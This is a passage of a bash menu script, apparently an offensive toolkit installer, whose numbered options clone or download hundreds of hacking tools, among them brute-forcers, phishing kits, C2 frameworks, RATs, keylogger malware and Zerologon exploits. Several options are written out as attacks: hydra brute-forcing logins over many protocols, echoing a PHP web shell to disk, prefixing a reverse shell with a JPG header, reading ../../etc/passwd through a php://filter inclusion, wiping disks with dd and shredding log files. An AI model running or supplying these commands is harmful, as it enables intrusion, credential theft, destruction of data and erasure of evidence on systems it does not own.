	;;
	"283")
		Scarica "$ENTRAW""optiv/Talon/master/Talon.go"
	;;
	"284")
		Clona "brutemap-dev/brutemap"
	;;
	"285")
		Clona "louisabraham/ffpass"
	;;
	"286")
		Clona "iphelix/dnschef"
	;;
	"287")
		Clona "boku7/LibreHealth-authRCE"
	;;
	"288")
		Clona "dark-lbp/isf"
	;;
	"289")
		Clona "onccgroup/redsnarf"
	;;
	"290")
		Scarica "$ENTRAW""initstring/evil-ssdp/master/evil_ssdp.py"
	;;
	"291")
		Scarica "$ENTRAW""KALILINUXTRICKSYT/easymacchanger/master/installer.sh"
		Scarica "$ENTRAW""KALILINUXTRICKSYT/easymacchanger/master/easymacchanger"
	;;
	"292")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""sbdchd/macchanger/master/macchanger"
		fi
	;;
	"293")
		Scarica "$ENTRAW""OsandaMalith/PE2HTML/master/PE2HTML.c"
	;;
	"294")
		Clona "TryCatchHCF/Cloakify"
	;;
	"295")
		Clona "wintrmvte/Shellab"
	;;
	"296")
		Clona "Z4nzu/hackingtool"
	;;
	"297")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""OffXec/fastssh/master/fastssh.sh"
		fi
	;;
	"298")
		Clona "rbsec/sslscan"
	;;
	"299")
		Clona "brandonskerritt/RustScan"
	;;
	"300")
		Clona "laramies/theHarvester"
	;;
	"301")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""ufuksungu/MySqlBruteForce/master/mysql.py"
		fi
	;;
	"302")
		Clona "duyet/bruteforce-database"
	;;
	"303")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""KTN1990/PostgreSQL--Attack-on-default-password-AUTOEXPLOITING-/master/DB.py"
		fi
	;;
	"304")
		Scarica "$ENTRAW""GitHackTools/BruteDum/master/brutedum.py"
	;;
	"305")
		Scarica "$ENTRAW""lucaboni92/BlueFuzz/master/bluetooth_scanner.py"
		Scarica "$ENTRAW""lucaboni92/BlueFuzz/master/obd_generator.py"
	;;
	"306")
		Clona "lockfale/OSINT-Framework"
	;;
	"307")
		Clona "Netflix-Skunkworks/Scumblr"
	;;
	"308")
		Clona "yogeshojha/rengine"
	;;
	"309")
		Clona "mdsecactivebreach/Chameleon"
	;;
	"310")
		Clona "future-architect/vuls"
	;;
	"311")
		Scarica "$ENTRAW""ethicalhackerproject/TaiPan/master/TaiPan_v1.0.py"
		Scarica "$ENTRAW""ethicalhackerproject/TaiPan/master/listener.py"
	;;
	"312")
		Scarica "$ENTRAW""T-S-A/smbspider/master/smbspider.py"
	;;
	"313")
		Scarica "$ENTRAW""s4vitar/rpcenum/master/rpcenum"
	;;
	"314")
		Scarica "$ENTRAW""danielwolfmann/Invoke-WordThief/master/logger.py"
	;;
	"315")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "M0tHs3C/Hikxploit"
		fi
	;;
	"316")
		Clona "sundowndev/PhoneInfoga"
	;;
	"317")
		if [[ "$TDOM" == "" ]];
		then
			read -p "Digit a target domain (example, mydoain.com): " TDOM
		fi
		for RECORD in A AAAA A+AAAA ANY CNAME MX NS PTR SOA SRV; do dig "$TDOM" "$RECORD" >> "$TDOM"-nsinfo.txt; done
		echo "All DNS infos are stored in ""$TDOM""-nsinfo.txt file"
	;;
	"318")
		Clona "digininja/pipal"
	;;
	"319")
		Clona "marcrowProject/Bramble"
	;;
	"320")
		Clona "stevemcilwain/quiver"
	;;
	"321")
		Clona "lvaccaro/truecrack"
	;;
	"322")
		Clona "abdulr7mann/hackerEnv"
	;;
	"323")
		Clona "ASHWIN990/ADB-Toolkit"
	;;
	"324")
		hciconfig
		read -p "Digit your Bt device: " BTDEV
		if [[ "$BTDEV" != "" ]];
		then
			hciconfig "$BTDEV" up
			hcitool scan
			read -p "Digit Bt MAC address: " BTMAC
			if [[ "$BTMAC" != "" ]];
			then
				hcitool name "$BTMAC"
				hcitool inq "$BTMAC"
				sdptool browse "$BTMAC"
				l2ping "$BTMAC"
				btscanner
			fi
		fi
	;;
	"325")
		Clona "projectdiscovery/httpx"
	;;
	"326")
		Clona "metachar/PhoneSploit"
	;;
	"327")
		Clona "xtiankisutsa/twiga"
	;;
	"328")
		Clona "citronneur/rdpy"
	;;
	"329")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "aerissecure/rdpy"
		fi
	;;
	"330")
		Clona "fhirschmann/rdp"
	;;
	"331")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""mkdirlove/SSLSTRIP-NG/master/sslstrip-ng.sh"
		fi
	;;
	"332")
		Clona "Ciphey/Ciphey"
	;;
	"333")
		Scarica "$ENTRAW""SecureAuthCorp/impacket/master/examples/smbserver.py"
 	;;
	"334")
		if [[ -f $(which hydra) ]];
		then
			echo "Digit the protocol to login-attack"
			echo -ne " 1. snmp\n 2. ftp\n 3. ssh\n 4. pop3\n 5. smtp\n 6. rdp\n 7. smb\n 8. ldap2\n 9. vnc\n 10. mysql\n 11. postgresql\n 12. telnet\n"
			read -p "Protocol-type: " PROTO
			if [[ "$TIP" == "0.0.0.0" ]];
			then
				read -p "Digit IPtarget or URLtarget: " TIP
			fi
			if [[ "$PROTO" != "" ]];
			then
				if [[ "$WORDLIST" == "" ]];
				then
					echo "Digit a password wordlist filepath"
					find /usr/share/wordlists/
					read -e -p "(example, /usr/share/wordlists/rockyou.txt): " WORDLIST
				fi
				if [[ -f "$WORDLIST" ]];
				then
					if [[ "$PROTO" == "1" ]];
					then
						hydra -P "$WORDLIST" -v "$IP" snmp
					elif [[ "$PROTO" == "9" ]];
					then
						hydra -V -P "$WORDLIST" "$IP" vnc
					else
						echo "Digit ad username or a wordlist username filepath"
						find /usr/share/wordlists
						read -e -p "(example, admin or /usr/share/wordlists/nmap.lst): " USR
						if [[ "$USR" != "" ]];
						then
							case "$PROTO" in
								"2")
									if [[ -f "$URS" ]];
									then
										hydra -t 1 -L "$USR" -P "$WORDLIST" -vV "$IP" ftp
									else
										hydra -t 1 -l "$USR" -P "$WORDLIST" -vV "$IP" ftp
									fi
								;;
								"3")
									if [[ -f "$URS" ]];
									then
										hydra -L "$USR" -P "$WORDLIST" -v -V "$IP" ssh
									else
										hydra -l "$USR" -P "$WORDLIST" -v -V "$IP" ssh
									fi
								;;
								"4")
									if [[ -f "$URS" ]];
									then
										hydra -P "$WORDLIST" -L "$USR" -f "$IP" -V pop3
									else
										hydra -P "$WORDLIST" -l "$USR" -f "$IP" -V pop3
									fi
								;;
								"5")
									if [[ -f "$URS" ]];
									then
										hydra -L "$USR" -P "$WORDLIST" "$IP" smtp
									else
										hydra -l "$USR" -P "$WORDLIST" "$IP" smtp
									fi
								;;
								"6")
									if [[ -f "$URS" ]];
									then
										hydra -t 1 -V -f -L "$USR" -P "$WORDLIST" rdp://"$IP"
									else
										hydra -t 1 -V -f -l "$USR" -P "$WORDLIST" rdp://"$IP"
									fi
								;;
								"7")
									if [[ -f "$URS" ]];
									then
										hydra -t 1 -V -f -L "$USR" -P "$WORDLIST" "$IP" smb
									else
										hydra -t 1 -V -f -l "$USR" -P "$WORDLIST" "$IP" smb
									fi
								;;
								"8")
									if [[ -f "$URS" ]];
									then
										hydra -V -f -L "$USR" -P "$WORDLIST" "$IP" ldap2
									else
										hydra -V -f -l "$USR" -P "$WORDLIST" "$IP" ldap2
									fi
								;;
								"10")
									if [[ -f "$URS" ]];
									then
										hydra -V -f -L "$USR" -P "$WORDLIST" "$IP" mysql
									else
										hydra -V -f -l "$USR" -P "$WORDLIST" "$IP" mysql
									fi
								;;
								"11")
									if [[ -f "$URS" ]];
									then
										hydra -V -L "$USR" -P "$WORDLIST" "$IP" postgres
									else
										hydra -V -l "$USR" -P "$WORDLIST" "$IP" postgres
									fi
								;;
								"12")
									if [[ -f "$URS" ]];
									then
										hydra -V -L "$USR" -P "$WORDLIST" "$IP" telnet
									else
										hydra -V -l "$USR" -P "$WORDLIST" "$IP" telnet
									fi
								;;
								*)
									echo "Invalid option"
								;;
								esac
						fi
					fi
				else
					echo "$WORDLIST"" does not exist"
				fi
			fi
		else
			echo "Please, install hydra-thc tool"
		fi
	;;
	"335")
		Clona "mschwager/fierce"
	;;
	"336")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "sciencemanx/x86-analysis"
		fi
	;;
	"337")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "cryptator/assembly-code-analysis"
		fi
	;;
	"338")
		Clona "plasma-disassembler/plasma"
	;;
	"339")
		Clona "cea-sec/miasm"
	;;
	"340")
		Clona "wisk/medusa"
	;;
	"341")
		Clona "REDasmOrg/REDasm"
	;;
	"342")
		Clona "vivisect/vivisect"
	;;
	"343")
		Scarica "$ENTRAW""busterb/msmailprobe/master/msmailprobe.go"
	;;
	"344")
		Clona "0xZDH/o365spray"
	;;
	"345")
		Scarica "$ENTRAW""gremwell/o365enum/master/o365enum.py"
	;;
	"346")
		Scarica "https://www.benf.org/other/cfr/cfr-0.150.jar"
	;;
	"347")
		Clona "kayak/pypika"
	;;
	"348")
		Clona "brimstone/go-shellcode"
	;;
	"349")
		Scarica "$ENTRAW""TheBinitGhimire/Web-Shells/master/smevk.php"
	;;
	"350")
		if [[ "$TURL" == "http://0.0.0.0" ]];
		then
			echo "Digit a remote IP target"
			read -p "(example, http://192.168.1.1)" TURL
		fi
		echo "Digit a wordlist fullpath"
		find /usr/share/dirbuster/wordlists/
		read -e -p "(example, /usr/share/dirbuster/wordlists/directory-​list-2.3-medium.txt)" WORDLIST
		if [[ -f "$WORDLIST" ]];
		then
			gobuster dir -w "$WORDLIST" -u "$TURL"
		fi
	;;
	"351")
		Clona "cr0hn/dockerscan"
	;;
	"352")
		Clona "RhinoSecurityLabs/ccat"
	;;
	"353")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "ujjwal96/njaXt"
		fi
	;;
	"354")
		Clona "toxic-ig/SQL-XSS"
	;;
	"355")
		Clona "swisskyrepo/SSRFmap"
	;;
	"356")
		Clona "gquere/pwn_jenkins"
	;;
	"357")
		Clona "java-decompiler/jd-gui"
	;;
	"358")
		Clona "intelowlproject/IntelOwl"
	;;
	"359")
		Clona "lgandx/Responder"
	;;
	"360")
		Clona "tokyoneon/Arcane"
	;;
	"361")
		Clona "yeggor/UEFI_RETool"
	;;
	"362")
		Clona "nidem/kerberoast"
	;;
	"363")
		Clona "projectdiscovery/nuclei"
		Clona "projectdiscovery/nuclei-templates"
	;;
	"364")
		Clona "opsdisk/pagodo"
	;;
	"365")
		ls
		echo "Digit a jpg file fullpath to dump jpg header"
		read -p "(example, background.jpg): " JPG
		if [[ -f "$JPG" ]];
		then
			echo "Digit a php revshell file fullpath to add jpg header"
			read -e -p "(example, revshell.php): " REVSH
			if [[ -f "$REVSH" ]];
			then
				head -c 20 "$JPG" > test.txt
				cat test.txt "$REVSH" > revshell.php.jpg
			fi
		fi
	;;
	"366")
		echo "<?php system($_GET['cmd']); ?>" > cmd-get.php
	;;
	"367")
		echo "<?php system($_REQUESTS['cmd']); ?>" > cmd-reqs.php
	;;
	"368")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "Neetx/sshdodge"
		fi
	;;
	"369")
		Clona "trustedsec/meterssh"
	;;
	"370")
		Scarica "$ENTRAW""norksec/torcrack/master/torcrack.py"
	;;
	"372")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""aryanrtm/sshBrutal/master/sshbrutal.sh"
		fi
	;;
	"373")
		Clona "wuseman/WBRUTER"
	;;
	"374")
		Clona "liggitt/audit2rbac"
	;;
	"375")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""mhausenblas/kaput/master/main.go"
		fi
	;;
	"376")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""mjm918/python-AES-encryption-socket-secure-chat/master/client.py"
			Scarica "$ENTRAW""mjm918/python-AES-encryption-socket-secure-chat/master/server.py"
		fi
	;;
	"377")
		Scarica "$ENTRAW""SusmithKrishnan/neuron/master/neuron.conf"
		Scarica "$ENTRAW""SusmithKrishnan/neuron/master/neuron.py"
		Scarica "$ENTRAW""SusmithKrishnan/neuron/master/server.py"
	;;
	"378")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "ludvigknutsmark/python-chat"
		fi
	;;
	"379")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""sathwikv143/Encrypted-Python-Chat/master/client.py"
			Scarica "$ENTRAW""sathwikv143/Encrypted-Python-Chat/master/server.py"
		fi
	;;
	"380")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""osalpekar/Encrypted-Chat/master/client.py"
			Scarica "$ENTRAW""osalpekar/Encrypted-Chat/master/server.py"
			Scarica "$ENTRAW""osalpekar/Encrypted-Chat/master/utils.py"
		fi
	;;
	"381")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "LatrecheYasser/Secure-Python-Chat"
		fi
	;;
	"382")
		Clona "spec-sec/SecureChat"
	;;
	"384")
		Clona "ernw/ss7MAPer"
	;;
	"385")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "blark/cli-phisher"
		fi
	;;
	"386")
		Scarica "$ENTRAW""sharyer/GSMEvil/master/ImsiEvil.py"
	;;
	"387")
		Clona "Oros42/IMSI-catcher"
	;;
	"388")
		Scarica "$ENTRAW""sharyer/GSMEvil/master/SmsEvil.py"
	;;
	"389")
		ipconfig
		echo "Choose an interface to intercept the traffic"
		read -p "(example, eth0): " NIC
		if [[ "$NIC" != "" ]];
		then
			tcpdump -ni $NIC -w packets.cap
		fi
	;;
	"390")
		Clona "lanmaster53/recon-ng"
	;;
	"391")
		Clona "methos2016/recon-ng"
	;;
	"392")
		Clona "zerosum0x0/koadic"
	;;
	"393")
		Clona "clr2of8/DPAT"
	;;
	"394")
		Clona "Jewel591/xssmap"
	;;
	"395")
		Clona "JettChenT/scan-for-webcams"
	;;
	"396")
		Clona "entynetproject/entropy"
	;;
	"397")
		Clona "indexnotfound404/spycam"
	;;
	"398")
		Clona "CCrashBandicot/IPCam"
	;;
	"399")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "nathan242/ipcam-cctv"
		fi
	;;
	"400")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "Benehiko/GoNetworkCameraScanner"
		fi
	;;
	"401")
		Clona "vanpersiexp/expcamera"
	;;
	"402")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "TrustMe00/experience_synology_attack"
		fi
	;;
	"403")
		Clona "Screetsec/TheFatRat"
	;;
	"404")
		Clona "OWASP/D4N155"
	;;
	"405")
		Clona "bkerler/android_universal"
	;;
	"406")
		Clona "0xInfection/XSRFProbe"
	;;
	"407")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "avinashkranjan/Malware-with-Backdoor-and-Keylogger"
		fi
	;;
	"408")
		Clona "AdrianVollmer/PowerHub"
	;;
	"409")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "tz4678/backshell"
		fi
	;;
	"410")
		Clona "mesquidar/adbsploit"
	;;
	"411")
		Clona "H4ckForJob/dirmap"
	;;
	"412")
		Clona "kurogai/nero-phishing-server"
	;;
	"413")
		Clona "KnightSec-Official/Phlexish"
	;;
	"414")
		Clona "hhhrrrttt222111/Dorkify"
	;;
	"415")
		Clona "Chr0m0s0m3s/DeadTrap"
	;;
	"416")
		Installa
	;;
	"417")
		if [[ "$TDOM" == "" ]];
		then
			echo "Digit a domain to get smtp data"
			read -p "(example, domain.com): " TDOM
		fi
		nslookup -q=mx "$TDOM"
	;;
	"418")
		Scarica "$ENTRAW""pentestmonkey/smtp-user-enum/master/smtp-user-enum.pl"
	;;
	"419")
		Scarica "$ENTRAW""altjx/ipwn/master/iSMTP/iSMTP.py"
	;;
	"420")
		Clona "techgaun/github-dorks"
	;;
	"421")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""tango-j/SMTP-Open-Relay-Attack-Test-Tool/master/OpenRelay.py"
		fi
	;;
	"422")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "crazywifi/SMTP_Relay_Phisher"
		fi
	;;
	"423")
		Scarica "$ENTRAW""NickSanzotta/smbShakedown/master/smbShakedown.py"
	;;
	"424")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""balaganeshgbhackers/Emailspoofing/master/Smtprelay.py"
		fi
	;;
	"425")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "RobinMeis/MITMsmtp"
		fi
	;;
	"426")
		Clona "mikechabot/smtp-email-spoofer-py"
	;;
	"427")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "yasserjanah/ZeS0MeBr"
		fi
	;;
	"428")
		Clona "tintinweb/striptls"
	;;
	"429")
		ls /dev/
		lsblk -o NAME,SIZE,LABEL,TYPE,RO,MOUNTPOINT,UUID
		echo "Select a device to wipe without /dev/"
		read -p "(example, sdd): " TDV
		if [[ "$TDV" != "" ]];
		then
			dd if=/dev/zero of=/dev/$TDV bs=1M
		fi
	;;
	"430")
		echo "Digit a fullpath file to wipe"
		read -e -p "(example, /home/username/logfile): " TFL
		if [[ "$TFL" != "" ]];
		then
			if [[ -f "$TFL" ]];
			then
				wipe -fs "$TFL"
			fi
		fi
	;;
	"431")
		echo "Digit a fullpath file to shred"
		read -e -p "(example, /home/username/logfile): " TFL
		if [[ "$TFL" != "" ]];
		then
			if [[ -f "$TFL" ]];
			then
				shred -fuz "$TFL"
			fi
		fi
	;;
	"432")
		echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/shellcodes/android with extension"
		read -p "(example exploit.py): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Scarica "$ENTRAW""offensive-security/exploitdb/master/shellcodes/android/$NOMEFL"
		fi
	;;
	"433")
		echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/shellcodes/linux with extension"
		read -p "(example exploit.py): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Scarica "$ENTRAW""offensive-security/exploitdb/master/shellcodes/linux/$NOMEFL"
		fi
	;;
	"434")
		echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/shellcodes/linux_x86-64 with extension"
		read -p "(example exploit.py): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Scarica "$ENTRAW""offensive-security/exploitdb/master/shellcodes/linux_x86-64/$NOMEFL"
		fi
	;;
	"435")
		echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/shellcodes/linux_x86 with extension"
		read -p "(example exploit.py): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Scarica "$ENTRAW""offensive-security/exploitdb/master/shellcodes/linux_x86/$NOMEFL"
		fi
	;;
	"436")
		echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/shellcodes/windows with extension"
		read -p "(example exploit.py): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Scarica "$ENTRAW""offensive-security/exploitdb/master/shellcodes/windows/$NOMEFL"
		fi
	;;
	"437")
		echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/shellcodes/windows_x86-64 with extension"
		read -p "(example exploit.py): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Scarica "$ENTRAW""offensive-security/exploitdb/master/shellcodes/windows_x86-64/$NOMEFL"
		fi
	;;
	"438")
		echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/shellcodes/windows_x86 with extension"
		read -p "(example exploit.py): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Scarica "$ENTRAW""offensive-security/exploitdb/master/shellcodes/windows_x86/$NOMEFL"
		fi
	;;
	"439")
		Clona "DarkSecDevelopers/HiddenEye"
	;;
	"440")
		Clona "fO-000/bluescan"
	;;
	"441")
		Clona "laramies/metagoofil"
	;;
	"442")
		Clona "Flo354/iOSForensic"
	;;
	"443")
		Clona "as0ler/iphone-dataprotection"
	;;
	"444")
		Scarica "$ENTRAW""jantrim/iosbackupexaminer/master/iosbackupexaminer.py"
	;;
	"445")
		Clona "evilsocket/kitsune"
	;;
	"446")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""aarsakian/MFTExtractor/master/MFTExtractor.go"
		fi
	;;
	"447")
		Clona "MillerTechnologyPeru/hcitool"
	;;
	"448")
		Clona "m0nad/HellRaiser"
	;;
	"449")
		Clona "RustScan/RustScan"
	;;
	"450")
		Clona "IFGHou/wapiti"
	;;
	"451")
		Clona "Ettercap/ettercap"
	;;
	"452")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "Vulnerability-scanner/Lazy-RDP"
		fi
	;;
	"453")
		Clona "zt2/sqli-hunter"
	;;
	"454")
		Clona "MrSqar-Ye/BadMod"
	;;
	"455")
		Clona "future-architect/vuls"
	;;
	"456")
		Clona "almandin/fuxploider"
	;;
	"457")
		Clona "Moham3dRiahi/XAttacker"
	;;
	"458")
		Clona "s0md3v/Corsy"
	;;
	"459")
		Scarica "$ENTRAW""skavngr/rapidscan/master/rapidscan.py"
	;;
	"460")
		Clona "s0md3v/Silver"
	;;
	"461")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "haasosaurus/ace-voip"
		fi
	;;
	"462")
		Clona "royhills/arp-scan"
	;;
	"463")
		Clona "Zapotek/cdpsnarf"
	;;
	"464")
		Clona "fwaeytens/dnsenum"
	;;
	"465")
		Clona "wireghoul/dotdotpwn"
	;;
	"466")
		Clona "FortyNorthSecurity/EyeWitness"
	;;
	"467")
		Clona "JohnTroony/Blisqy"
	;;
	"468")
		Clona "n00py/WPForce"
	;;
	"469")
		Clona "BlackXploits/WPBrute"
	;;
	"470")
		Clona "HatBashBR/ShodanHat"
	;;
	"471")
		Clona "jimywork/shodanwave"
	;;
	"472")
		Clona "random-robbie/My-Shodan-Scripts"
	;;
	"473")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "woj-ciech/Kamerka-GUI"
		fi
	;;
	"474")
		Scarica "$ENTRAW""m4ll0k/Shodanfy.py/master/shodanfy.py"
	;;
	"475")
		Clona "MS-WEB-BN/h4rpy"
	;;
	"476")
		Clona "sdnewhop/grinder"
	;;
	"477")
		Clona "gelim/censys"
	;;
	"478")
		Clona "twelvesec/gasmask"
	;;
	"479")
		Clona "SuperBuker/CamHell"
	;;
	"480")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "AndyCyberSec/direncrypt"
		fi
	;;
	"481")
		Clona "0xInfection/TIDoS-Framework"
	;;
	"482")
		Clona "francozappa/knob"
	;;
	"483")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "TheDevFromKer/CMS-Attack"
		fi
	;;
	"484")
		Clona "Dionach/CMSmap"
	;;
	"485")
		Clona "r3dxpl0it/TheXFramework"
	;;
	"486")
		Clona "sowdust/tafferugli"
	;;
	"487")
		Clona "arthaud/git-dumper"
	;;
	"488")
		Clona "Taguar258/Raven-Storm"
	;;
	"489")
		Clona "david3107/squatm3"
	;;
	"490")
		Clona "netevert/dnsmorph"
	;;
	"491")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""TeamFoxtrot-GitHub/DNSMap/master/dnsmap.py"
		fi
	;;
	"492")
		Clona "darkoperator/dnsrecon"
	;;
	"493")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""neiltyagi/DNSRECON/master/dnsrecon.py"
			Scarica "$ENTRAW""neiltyagi/DNSRECON/master/subdomain.txt"
		fi
	;;
	"494")
		Clona "optiv/ScareCrow"
	;;
	"496")
		Clona "rs/dnstrace"
	;;
	"497")
		Clona "redsift/dnstrace"
	;;
	"498")
		Clona "dkorunic/dnstrace"
	;;
	"499")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""hyp3rlinx/DarkFinger-C2/master/DarkFinger-C2.py"
		fi
	;;
	"500")
		Clona "nettitude/PoshC2"
	;;
	"501")
		Clona "LukaSikic/subzy"
	;;
	"502")
		Clona "sensepost/godoh"
	;;
	"503")
		Clona "lu4p/ToRat"
	;;
	"504")
		Clona "airbus-seclab/android_emuroot"
	;;
	"505")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "joswr1ght/btfind"
		fi
	;;
	"506")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "Aarif123456/passwordCracker"
		fi
	;;
	"507")
		Scarica "$ENTRAW""GauthamGoli/rar-Password-Cracker/master/bruteforce.py"
	;;
	"508")
		Clona "risksense/zerologon"
		Scarica "$ENTRAW""SecureAuthCorp/impacket/master/examples/secretsdump.py"
	;;
	"509")
		Clona "bb00/zer0dump"
	;;
	"510")
		Clona "VoidSec/CVE-2020-1472"
	;;
	"511")
		Clona "Isaacdelly/Plutus"
	;;
	"512")
		Clona "dan-v/bruteforce-bitcoin-brainwallet"
	;;
	"513")
		Clona "SMH17/bitcoin-hacking-tools"
	;;
	"514")
		Clona "maxlandon/wiregost"
	;;
	"515")
		Clona "3v4Si0N/HTTP-revshell"
	;;
	"516")
		Scarica "$ENTRAW""NotMedic/NetNTLMtoSilverTicket/master/dementor.py"
	;;
	"517")
		Clona "dwisiswant0/crlfuzz"
	;;
	"518")
		Scarica "$ENTRAW""chinarulezzz/pixload/master/bmp.pl"
	;;
	"519")
		Scarica "$ENTRAW""chinarulezzz/pixload/master/gif.pl"
	;;
	"520")
		Scarica "$ENTRAW""chinarulezzz/pixload/master/jpg.pl"
	;;
	"521")
		Scarica "$ENTRAW""chinarulezzz/pixload/master/png.pl"
	;;
	"522")
		Scarica "$ENTRAW""chinarulezzz/pixload/master/webp.pl"
	;;
	"523")
		Clona "nerodtm/ReconCobra---Complete-Automated-Pentest-Framework-For-Information-Gathering"
	;;
	"524")
		Scarica "$ENTRAW""tothi/rbcd-attack/master/rbcd.py"
	;;
	"525")
		Clona "jetmore/swaks"
	;;
	"526")
		Scarica "$ENTRAW""0x90/vpn-arsenal/master/IKEProber.pl"
		Scarica "$ENTRAW""0x90/vpn-arsenal/master/ikecrack-snarf-1.00.pl"
	;;
	"527")
		Clona "Moham3dRiahi/XAttacker"
	;;
	"528")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "mfocuz/DNS_Hunter"
		fi
	;;
	"529")
		Scarica "$ENTRAW""riusksk/StrutScan/master/StrutScan.pl"
	;;
	"530")
		Clona "AlisamTechnology/ATSCAN"
	;;
	"531")
		Clona "CERT-Polska/hfinger"
	;;
	"532")
		Clona "Phoenix1112/subtakeover"
	;;
	"533")
		Clona "securing/DumpsterDiver"
	;;
	"534")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""TheNittam/RPOscanner/master/rpo.py"
		fi
	;;
	"535")
		Clona "nil0x42/cracking-utils"
	;;
	"536")
		Clona "Pure-L0G1C/Loki"
	;;
	"537")
		Clona "adnane-X-tebbaa/Katana"
	;;
	"538")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "smackerdodi/CVE-bruter"
		fi
	;;
	"539")
		ls
		echo "Digit a file to clear metadata in it"
		read -e -p "(example, photo.jpg): " PHT
		if [[ -f "$PHT" ]];
		then
			exiftool -all= "$PHT"
		fi
	;;
	"540")
		Clona "blunderbuss-wctf/wacker"
	;;
	"541")
		Clona "wifiphisher/wifiphisher"
	;;
	"542")
		Clona "digininja/CeWL"
	;;
	"543")
		Scarica "$ENTSSL""praetorian-inc/trident/releases/download/v0.1.3/trident_0.1.3_linux_i386.tar.gz"
	;;
	"544")
		Scarica "$ENTSSL""praetorian-inc/trident/releases/download/v0.1.3/trident_0.1.3_linux_x86_64.tar.gz"
	;;
	"545")
		Clona "praetorian-inc/trident"
	;;
	"546")
		Clona "tstillz/webshell-scan"
	;;
	"547")
		Scarica "$ENTRAW""jofpin/fuckshell/master/fuckshell.py"
	;;
	"548")
		Clona "followboy1999/webshell-scanner"
	;;
	"549")
		Clona "emposha/Shell-Detector"
	;;
	"550")
		Clona "calebmadrigal/trackerjacker"
	;;
	"551")
		Scarica "$ENTRAW""Cyb0r9/SocialBox/master/SocialBox.sh"
		Scarica "$ENTRAW""Cyb0r9/SocialBox/master/install-sb.sh"
	;;
	"552")
		Clona "MobSF/Mobile-Security-Framework-MobSF"
	;;
	"553")
		Scarica "$ENTRAW""Ebryx/GitDump/master/git-dump.py"
	;;
	"554")
		Clona "FluxionNetwork/fluxion"
	;;
	"555")
		Clona "m8r0wn/subscraper"
	;;
	"556")
		Clona "skynet0x01/tugarecon"
	;;
	"557")
		Clona "knassar702/scant3r"
	;;
	"558")
		Clona "dwisiswant0/findom-xss"
	;;
	"559")
		Clona "epi052/feroxbuster"
	;;
	"560")
		Clona "Datalux/Osintgram"
	;;
	"561")
		echo "Digit an url with protocol and get parameter with equal sign"
		read -p "(example, http://site.web/news.php?file=): " URL
		if [[ "$URL" != "" ]];
		then
			echo "Digit the file name or path, even with directory traversal, to encode in base64"
			read -p "(example, ../../etc/passwd or ./index.php): " PAGE
			if [[ "$PAGE" != "" ]];
			then
				if [[ "$ANON" == "Enabled" ]];
				then
					curl -s -k -L --socks5 "$SANON" "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
				else
					curl -s -k -L "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
				fi
			fi
		fi
	;;
	"562")
		Clona "tennc/webshell"
	;;
	"563")
		Clona "Viralmaniar/Passhunt"
	;;
	"564")
		Clona "vanhienfs/saycheese"
	;;
	"565")
		Scarica "$ENTRAW""AnonymousAt3/cyberdoor/main/cyberdoor"
	;;
	"566")
		Clona "0xAbdullah/0xWPBF"
	;;
	"567")
		Clona "Leviathan36/kaboom"
	;;
	"568")
		Clona "archerysec/archerysec"
	;;
	"569")
		Clona "commixproject/commix"
	;;
	"570")
		Clona "hegusung/RPCScan"
	;;
	"571")
		Clona "sensepost/ruler"
